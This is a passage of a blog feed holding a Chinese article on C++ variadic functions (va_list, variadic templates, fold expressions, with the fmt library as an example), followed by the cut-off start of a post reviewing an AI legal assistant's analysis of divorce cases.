...)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> total = <span class="number">0</span>;</span><br><span class="line">    va_list args;</span><br><span class="line">    <span class="built_in">va_start</span>(args, n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        total += <span class="built_in">va_arg</span>(args, <span class="type">int</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">va_end</span>(args);</span><br><span class="line">    <span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="built_in">sum</span>(<span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>) &lt;&lt; std::endl; <span class="comment">// 输出: 15</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>变长参数函数在汇编层面的实现依赖于特定的平台和调用约定。基本的思想是<strong>通过栈（或在某些情况下是寄存器）来传递参数，并使用指针运算在内部遍历这些参数</strong>。优点是提供与C语言良好的兼容性，适用于需要与C代码接口的场合。</p><p>但是这种实现中，需要在<strong>调用函数时显式提供参数的个数</strong>。这是因为编译器在编译时<strong>不检查省略号后面参数的类型或数量</strong>，因此必须有一种方式来确定传递了多少个参数以及如何正确处理它们。最常见的方法是通过一个固定的参数指定后续参数的数量，不过也有其他方法，比如 <strong>printf 使用格式字符串中的格式说明符来确定后续参数的数量和类型</strong>。对于 <code>printf(&quot;i = %d, pi = %.2f, s = %s\n&quot;, i, pi, s);</code>，通过格式字符串中的<code>%d, %.2f, 和%s</code>自动推断出它需要从可变参数中读取一个整数(int), 一个双精度浮点数(double), 和一个字符串(char*)。</p><p>要注意这种方式<strong>不检查数据类型</strong>，错误地传递参数类型可能导致运行时错误。比如下面的调用中，第 1 个参数传成了字符串，编译器不会报错，但是运行时计算出来的结果是不对的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">std::cout &lt;&lt; <span class="built_in">sum</span>(<span class="number">5</span>, <span class="string">&quot;1&quot;</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>) &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><h2 id="C-11-的变参模板"><a href="#C-11-的变参模板" class="headerlink" title="C++11 的变参模板"></a>C++11 的变参模板</h2><p>随着 C++ 模板技术的发展，为了更好支持变参函数，C++11 引入了变参模板，<strong>不需要在调用时指定参数的个数，而是通过模板和递归函数展开来处理任意数量和类型的参数</strong>。上面的 sum 函数用变参模板实现如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 基本案例：当只有一个参数时，直接返回该参数</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function">T <span class="title">sum</span><span class="params">(T t)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 递归展开：接受一个参数和一个参数包，处理一个参数后，将剩余的参数包传递给下一个递归调用</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span>... Args&gt;</span></span><br><span class="line"><span class="function">T <span class="title">sum</span><span class="params">(T first, Args... args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> first + <span class="built_in">sum</span>(args...);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="built_in">sum</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>) &lt;&lt; std::endl; <span class="comment">// 输出: 15</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在底层，变参模板的实现依赖于<strong>编译器对模板的实例化过程</strong>。编译器会<strong>递归地将变参模板实例化为多个重载函数</strong>，每个函数处理一个参数，直到参数包被完全展开。这个过程完全在编译时进行，不涉及运行时性能开销。这个过程主要分两步：</p><ul><li>递归展开：编译器会生成一系列函数实例，每次调用中使用一个参数，直到参数列表为空。在上述例子中，sum(1, 2, 3, 4, 5) 会被展开为 1 + sum(2, 3, 4, 5)，接着 sum(2, 3, 4, 5) 被展开为 2 + sum(3, 4, 5)，以此类推。</li><li>终止条件：递归展开的过程需要一个终止条件来结束递归调用。在上述例子中，当参数包中只剩下一个参数时，会调用基础案例的sum(T t)，作为递归的终止条件。</li></ul><p>我们可以在上面模板函数中添加打印语句，然后在运行时观察到模板展开的结果。虽然这种方法不能直接展示编译时的情况，但它可以帮助理解模板是如何逐步被实例化和展开的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function">T <span class="title">sum</span><span class="params">(T t)</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Base case with &quot;</span> &lt;&lt; t &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span>... Args&gt;</span></span><br><span class="line"><span class="function">T <span class="title">sum</span><span class="params">(T first, Args... args)</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Processing &quot;</span> &lt;&lt; first &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> first + <span class="built_in">sum</span>(args...);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Processing 1</span><br><span class="line">Processing 2</span><br><span class="line">Processing 3</span><br><span class="line">Processing 4</span><br><span class="line">Base case with 5</span><br><span class="line">15</span><br></pre></td></tr></table></figure><h3 id="模板递归实例化"><a href="#模板递归实例化" class="headerlink" title="模板递归实例化"></a>模板递归实例化</h3><p>为了能够直观看到编译时模板的递归展开，我们可以用 Clang 提供的<code>-Xclang -ast-print</code>选项，显示模板展开后的抽象语法树（AST）。完整命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang++ -fsyntax-only -Xclang -ast-print -std=c++11 test.cpp</span><br></pre></td></tr></table></figure><p>可以看到下面结果：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240505_variadic_arguments_in_c++_template.png" alt="模板递归展开变参函数"></p><p>可以看到当函数 <code>sum(1, 2, 3, 4, 5)</code> 被调用时，编译器生成如下展开：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sum</span>&lt;<span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>&gt;(<span class="type">int</span> first, <span class="type">int</span> args, <span class="type">int</span> args, <span class="type">int</span> args, <span class="type">int</span> args)</span><br><span class="line"><span class="built_in">sum</span>&lt;<span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>&gt;(<span class="type">int</span> first, <span class="type">int</span> args, <span class="type">int</span> args, <span class="type">int</span> args)</span><br><span class="line"><span class="built_in">sum</span>&lt;<span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>&gt;(<span class="type">int</span> first, <span class="type">int</span> args, <span class="type">int</span> args)</span><br><span class="line"><span class="built_in">sum</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt;(<span class="type">int</span> first, <span class="type">int</span> args)</span><br><span class="line"><span class="built_in">sum</span>&lt;<span class="type">int</span>&gt;(<span class="type">int</span> first)</span><br></pre></td></tr></table></figure><p>这些展开显示了<strong>如何逐步减少参数的数量</strong>，每次调用处理一个参数并将剩余的参数传递到下一个递归调用。</p><h3 id="类型安全"><a href="#类型安全" class="headerlink" title="类型安全"></a>类型安全</h3><p>变参模板有一个优点就是<strong>类型安全</strong>，这是因为变参模板的实现依赖于<strong>编译器的模板展开机制，可以在编译时进行类型检查</strong>。前面 C 风格的变长参数 sum 实现中，函数调用时候，如果传入参数是一个 string，是可以通过编译的，在运行时结果才会出错。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">std::cout &lt;&lt; <span class="built_in">sum</span>(<span class="number">1</span>, <span class="string">&quot;2&quot;</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>) &lt;&lt; std::endl; <span class="comment">// 输出: 15</span></span><br></pre></td></tr></table></figure><p>而在变参模板中，函数调用每个参数都是<strong>在编译时明确指定的类型</strong>，编译器将<strong>检查加法操作是否对每种类型有效，这就确保了类型安全</strong>。上面代码尝试把int和string类型相加，将在编译时就直接报错，而不是等到运行时。如下图：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240505_variadic_arguments_in_c++_type_safe.png" alt="变参模板是类型安全的"></p><p>通过使用变参模板而不是传统的C风格变长参数，所有类型错误都在编译时被捕捉，不会在运行时突然崩溃。对于不支持的操作，比如尝试打印一个没有重载输出运算符的复杂对象，编译器会报错。这样的代码更加安全、清晰且易于维护。</p><h3 id="变参模板的局限"><a href="#变参模板的局限" class="headerlink" title="变参模板的局限"></a>变参模板的局限</h3><p>当然变参模板也有一些局限，熟悉递归的人可能会想到，递归展开的深度往往是有限的。这个问题在变参模板中也是存在的，<strong>编译器对递归展开的深度有限制，当参数过多时，可能会导致编译失败</strong>。Clang 编译器的默认<strong>模板递归实例化深度在 Mac 上是 1024 层</strong>，可以使用下面的 C++ 程序来测试 Clang 的模板递归深度限制。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="type">int</span> N&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Depth</span> &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> <span class="type">int</span> value = <span class="number">1</span> + Depth&lt;N - <span class="number">1</span>&gt;::value;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Depth</span>&lt;<span class="number">0</span>&gt; &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> <span class="type">int</span> value = <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;The depth is &quot;</span> &lt;&lt; Depth&lt;<span class="number">5000</span>&gt;::value &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码尝试实例化模板 <code>Depth&lt;5000&gt;</code>，如果超过了编译器默认的递归实例化深度限制，则会出现编译错误。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240505_variadic_arguments_in_c++_depth.png" alt="Clang 编译器默认的递归实例化深度限制"></p><p>除了递归深度问题，还有一些其他缺点也值得关注：</p><ol><li>在一些性能敏感的环境，递归模板函数的编译结果可能不如手写的迭代代码高效。</li><li><strong>编译速度变慢。</strong>变参模板的处理需要编译器在编译时展开和实例化模板，特别是当涉及复杂的递归展开和多层模板嵌套时，编译器的工作量显著增加。</li><li><strong>代码膨胀（二进制大小增加）</strong>。每次使用变参模板函数时，如果涉及到不同的参数类型组合，编译器需要生成该特定组合的新实例。<strong>每个实例都是一个单独的函数，这会增加最终可执行文件的大小</strong>。</li></ol><h2 id="C-17-的折叠表达式"><a href="#C-17-的折叠表达式" class="headerlink" title="C++17 的折叠表达式"></a>C++17 的折叠表达式</h2><p>在 C++11 引入变参模板后，社区和委员会也一直在评估其使用情况和局限性。随着技术和理解的进步，以及编译器技术的发展，折叠表达式在C++17中被认为是成熟且有用的，因此被加入标准。折叠表达式提供了一种<strong>非递归的方式来处理变参模板</strong>，有效解决了深度递归和编译效率问题。折叠表达式是一种新的语法，可以在编译时展开参数包，将参数包中的所有参数组合成一个表达式。</p><p>先来看简单示例代码，一个变参的 sum 和 show 打印函数，从代码行数来说比之前方案就简单了很多：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 变参的 sum 函数使用折叠表达式实现</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span>... Args&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">auto</span> <span class="title">sum</span><span class="params">(Args... args)</span> -&gt; <span class="title">decltype</span><span class="params">((args + ...))</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (args + ...);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 变参的打印日志函数</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span>... Args&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">show</span><span class="params">(Args&amp;&amp;... args)</span> </span>&#123;</span><br><span class="line">    (std::cout &lt;&lt; ... &lt;&lt; args) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;  <span class="comment">// C++17 折叠表达式</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 调用 sum 函数</span></span><br><span class="line">    <span class="keyword">auto</span> result = <span class="built_in">sum</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;The result is: &quot;</span> &lt;&lt; result &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可以处理不同类型的数据，结果类型会根据传入参数自动推导</span></span><br><span class="line">    <span class="keyword">auto</span> result2 = <span class="built_in">sum</span>(<span class="number">1</span>, <span class="number">2.5</span>, <span class="number">3.0</span>, <span class="number">4.5</span>);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;The result with mixed types is: &quot;</span> &lt;&lt; result2 &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 类型安全检查会发现这里有问题，编译不过</span></span><br><span class="line">    <span class="comment">// auto result2 = sum(1, &quot;2.5&quot;, 3.0, 4.5);</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">show</span>(<span class="string">&quot;This is a&quot;</span>, <span class="string">&quot; variadic&quot;</span>, <span class="string">&quot; template&quot;</span>, <span class="string">&quot; with&quot;</span>, <span class="string">&quot; folding&quot;</span>, <span class="string">&quot; expression.&quot;</span>, <span class="number">123</span>, <span class="number">45.67</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面实现了一个 sum 和一个打印变量的方法，<code>sum</code>函数利用了C++17的折叠表达式语法 <code>(args + ...)</code>。这种语法告诉编译器将加法运算符应用于所有给定的参数。如果函数被调用如 <code>sum(1, 2, 3, 4, 5)</code>，折叠表达式将展开为 <code>1 + 2 + 3 + 4 + 5</code>。同理，折叠表达式(<code>std::cout &lt;&lt; ... &lt;&lt; args</code>)将会对每个args进行展开，并应用<code>&lt;&lt;</code>运算符，这样做避免了递归调用，直接在一行中处理所有参数。</p><p>和模板变参一样，折叠表达式也是<strong>在编译时展开的</strong>，不会引入运行时开销。折叠表达式的优点在于<strong>简洁、高效</strong>，并且<strong>不会引入递归深度限制</strong>。同时，也是<strong>类型安全</strong>的，编译器会在编译时检查参数的类型，确保所有参数都可以正确地应用到表达式中。</p><h3 id="实现细节"><a href="#实现细节" class="headerlink" title="实现细节"></a>实现细节</h3><p>折叠表达式允许编译器通过<strong>一种简洁的语法规则来展开参数包</strong>，这种展开是在编译时完成的，具体的实现依赖于编译器的内部机制。从结果来看，当编译器遇到折叠表达式时，它会将表达式中的操作符应用于参数包中的每个元素。对于二元操作符如 <code>+，&lt;&lt;</code> 等，编译器生成一系列操作，这些操作按照指定的折叠模式（<strong>左折叠或右折叠</strong>）连接起来。</p><ul><li>左折叠 <code>((... op args))</code>：如果参数包为 {1, 2, 3}，结果为 ((1 + 2) + 3)。左折叠的应用场景如逻辑运算 AND 或 OR 操作，可以确保从左到右的短路评估。</li><li>右折叠 <code>((args op ...))</code>：如果参数包为 {1, 2, 3}，结果为 (1 + (2 + 3))。右折叠的应用场景如<strong>函数组合</strong>，从右至左组合函数更自然，因为这符合数学中的复合函数（g(f(x))）顺序。</li></ul><p>用 clang 可以看到编译器展开折叠表达式的结果，结果如下：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240506_variadic_arguments_in_c++_foldargs.png" alt="折叠表达式展开"></p><p>可以看到这里对于每个模板调用，只生成了一个展开的迭代的函数，而不是模板变参的递归实现。</p><h2 id="在开源库中的应用"><a href="#在开源库中的应用" class="headerlink" title="在开源库中的应用"></a>在开源库中的应用</h2><p>许多现代 C++ 库利用了变参模板和折叠表达式来实现其功能，使得这些库更加灵活、强大和类型安全。比如 <a href="https://github.com/fmtlib/fmt">fmt</a> 是一个现代化的 C++ 格式化库，提供了一种类型安全的方法来替换 C 风格的printf。在C++20标准中，fmt的核心功能被采纳为标准库的一部分，即<code>std::format</code>。它的用法很现代化，和 python 的 print 用法有点类似，如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">std::string s = fmt::format(<span class="string">&quot;The answer is &#123;&#125;.&quot;</span>, <span class="number">42</span>);</span><br><span class="line">fmt::<span class="built_in">print</span>(<span class="string">&quot;Hello, &#123;name&#125;! The answer is &#123;number&#125;. Goodbye, &#123;name&#125;.&quot;</span>,</span><br><span class="line">           fmt::<span class="built_in">arg</span>(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;World&quot;</span>), fmt::<span class="built_in">arg</span>(<span class="string">&quot;number&quot;</span>, <span class="number">42</span>));</span><br><span class="line">fmt::<span class="built_in">print</span>(<span class="built_in">fg</span>(fmt::color::steel_blue) | fmt::emphasis::italic,</span><br><span class="line">             <span class="string">&quot;你好&#123;&#125;！\n&quot;</span>, <span class="string">&quot;世界&quot;</span>);</span><br></pre></td></tr></table></figure><p>在它的实现中，有个比较重要的<code>make_format_args</code>函数，它用于创建一个存储参数引用的对象，该对象可以隐式转换为fmt::format_args。这个函数展示了变参模板的复杂用法，包括默认模板参数、模板非类型参数、参数包和SFINAE（Substitution Failure Is Not An Error）技术。具体<a href="https://github.com/fmtlib/fmt/blob/57593a123be5a1fcb3e1fbcdd5e9e38779f8cede/include/fmt/base.h#L2003">实现代码</a>如下：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240507_variadic_arguments_in_c++_fmt_impl.png" alt="make_format_args 利用变参模板的实现"></p><p>其中 <code>typename... T</code>是一个类型参数包，允许函数接受任意数量和类型的参数。<code>NUM_ARGS</code> 通过<code>sizeof...(T)</code>计算，这是一个编译时常数，表示传递给函数的参数数量。<code>NUM_NAMED_ARGS</code>通过<code>detail::count_named_args&lt;T...&gt;()</code>计算，这个值代表命名参数的数量。fmt库支持基于名称的参数引用，这个计算帮助库识别有多少个命名参数被传递。</p><p>函数返回一个模板结构体，用于存储和管理传递给函数的参数。该结构体将参数包装成<code>fmt::basic_format_arg</code>类型，这些参数可以在后续的格式化操作中使用。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文介绍了 C++ 中实现可变参数函数的三种方法：C 风格的变长参数列表、C++11 的变参模板和 C++17 的折叠表达式。这三种方法各有优缺点，适用于不同的场景。C 风格的变长参数列表适用于需要与 C 代码接口的场合，但是不支持类型安全。C++11 的变参模板通过递归展开实现了类型安全，但是可能存在递归深度限制和编译速度问题。C++17 的折叠表达式提供了一种简洁、高效的方式来处理变参模板，避免了递归调用和深度限制，同时保持了类型安全。</p><p>另外再补充说明下，本文部分内容是和 ChatGPT 结对，通过<strong>提问并验证的方式来学习和总结</strong>的，整体对话可以查看<a href="https://chat.openai.com/share/379704df-0920-40b7-bfc5-6d9f412ac155">ChatGPT - Variadic Templates in C++</a>。另外也参考了一些其他文档，如下：</p><ul><li><a href="https://en.cppreference.com/w/cpp/language/parameter_pack">Parameter pack (since C++11)</a></li><li><a href="https://en.cppreference.com/w/cpp/language/fold">Fold expressions (since C++17)</a></li><li><a href="https://stackoverflow.com/questions/1657883/variable-number-of-arguments-in-c">Variable number of arguments in C++?</a></li></ul>]]></content>
    
    
    <summary type="html">C++ 中实现可变参数函数的三种方法:C 风格变长参数列表、C++11 变参模板和 C++17 折叠表达式。文章详细介绍了每种方法的实现细节、优缺点及适用场景。C 风格变长参数适用于 C 语言接口，但不类型安全。变参模板通过递归展开保证类型安全，但可能遇到递归深度限制。折叠表达式则提供简洁高效的非递归方案，避免深度限制且保持类型安全。</summary>
    
    
    
    <category term="程序设计" scheme="https://selfboot.cn/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    
    <category term="C++" scheme="https://selfboot.cn/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>看 AI 法律助手如何分析离婚案件</title>
    <link href="https://selfboot.cn/2024/04/14/lawer_or_ai_copilot/"/>
    <id>https://selfboot.cn/2024/04/14/lawer_or_ai_copilot/</id>
    <published>2024-04-14T22:26:12.000Z</published>
    <updated>2024-06-07T06:32:37.905Z</updated>
    
    <content type="html"><![CDATA[<p>人工智能在各行各业的应用越来越广泛，法律行业也不例外。作为执业律师，为了看自己能不能被 AI 替代，之前体验过一些 AI 工具。比如最先进的 ChatGPT，当时体验完松了一口气，<strong>人工智能离智能还差一个“人工”</strong>，自己还是不能被替代的。</p><p>最近听说<a href="https://lvshi.baidu.com/">百度法行宝</a>很厉害，今天以婚姻纠纷为例，深度体验了下法行宝，忽然又有点危机感了。之前我已经帮助很多人解决过婚姻纠纷，对离婚案件有一定的经验，今天在这款 AI 工具上，第一次领略到了 AI 的强大。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240414_lawer_or_ai_copilot_doc.png" alt="百度法行宝支持很多常见纠纷的法律意见"></p><span id="more"></span><p>话不多说，一起来看看 AI 法律助手如何分析离婚案件。</p><h2 id="预设问题"><a href="#预设问题" class="headerlink" title="预设问题"></a>预设问题</h2><p>之前体验的 AI 工具都是通过聊天给法律建议，但是体验下来其实并不好。很多人不知道要提供什么信息，导致 AI 无法给出准确的建议。法行宝这点比较好，会预设不少问题，让用户按照问题一步步填写，最后才给出建议。离婚案件的预设问题如下：</p><ol><li>你是男方还是女方？</li><li>你们有没有结婚证？</li><li>你们双方对离婚是什么态度？</li><li>目前女方存在以下什么情形？</li><li>你们双方有没有谁是现役非文职军人？</li><li>你想离婚的原因是什么？(多选)</li><li>你们双方有谁去法院起诉过离婚吗？</li></ol><p>每一个问题给出一些选项，用户只需要选择即可。这样的设计很好，不仅让用户知道需要提供什么信息，也让 AI 能够更好的分析案件。比如离婚原因这里，如下图：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240414_lawer_or_ai_copilot_reason.png" alt="离婚原因选择"></p><p>这里列举了一些可能的离婚原因，选择不同，后续会影响给出的具体建议。</p><h2 id="AI-法律意见书"><a href="#AI-法律意见书" class="headerlink" title="AI 法律意见书"></a>AI 法律意见书</h2><p>当选择完上面内容后，就会生成一个法律意见书。内容很详细，一起来看看吧。首先给出了分析结论：</p><blockquote><p>你没有《中华人民共和国民法典》第一千零七十九条规定的双方感情确已破裂的情形，所以你向法院起诉离婚的请求将很难得到支持。</p></blockquote><p>因为我前面离婚理由那里什么都没有选择，所以这里直接说很难支持，还是挺智能的呀。意见书中给出的<strong>法条引用很精准，并且点击后能直接看到条款原文</strong>，这点做的很不错。之前不少 AI 工具的法条引用都是乱七八糟的，法行宝这个专业很多。看下图：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240414_lawer_or_ai_copilot_suggestion_1.png" alt="法律意见书目录整体结论"></p><p>意见书并没有到这里为止，还针对性的告诉我想离婚的话，需要提供哪些证据。比如：</p><ol><li>积极收集女方婚后存在过错的证据（如：家暴、出轨、重婚、与他人同居等）。</li><li>收集双方感情确已破裂的证据（如：婚后双方没有一起生活）。</li></ol><p>接着，还给出了很多法律建议，咱们一起往下看吧。</p><h2 id="AI-给出的离婚流程"><a href="#AI-给出的离婚流程" class="headerlink" title="AI 给出的离婚流程"></a>AI 给出的离婚流程</h2><p>先是离婚的流程，包括：</p><ul><li>协议离婚流程：双方共同申请离婚登记 -&gt; 冷静30天 -&gt; 双方共同申请离婚证（30天内） -&gt; 领取离婚证（离婚完成）</li><li>诉讼离婚流程：准备诉讼材料 -&gt; 向法院立案 -&gt; 法院审查 -&gt; 裁定是否受理 -&gt; 法院受理 -&gt; 组织双方调解 -&gt; 调解失败 -&gt; 进入审判 -&gt; 作出判决 -&gt; 判决离婚（离婚完成）</li></ul><p>还给出了需要的材料说明，非常详细，可以看下图：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240414_lawer_or_ai_copilot_suggestion_2.png" alt="AI 给出的离婚流程"></p><p>如果看过我之前文章，<a href="https://selfboot.cn/2023/08/05/divorce_legal_longtime/">必读的离婚法律指南：离婚流程要多久？</a>，应该对这些内容不陌生吧。让人想不到的是，AI 现在把这些流程也搞得这么明白，还这么清晰的列了出来。</p><h2 id="AI-文书"><a href="#AI-文书" class="headerlink" title="AI 文书"></a>AI 文书</h2><p>除了上面的一些法律具体建议，法行宝还给了一系列法律文书参考。包括民事起诉状，离婚调查取证申请书等，十分齐全。这些之前都是律师才有的内容，现在法行宝上直接免费提供，真的是太方便了。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240414_lawer_or_ai_copilot_suggestion_3.png" alt="AI 给出的各种文书"></p><p>这些文书<strong>比网上的模板质量好了一些</strong>，不过和<a href="https://selfboot.cn/links">小盛律师</a>根据个人案件起草的比，还是有不少差距的。免费的东西，还是有一些缺陷的，不然为啥那么多人找律师起草文书呢，哈哈。</p><h2 id="AI-的“人情味”"><a href="#AI-的“人情味”" class="headerlink" title="AI 的“人情味”"></a>AI 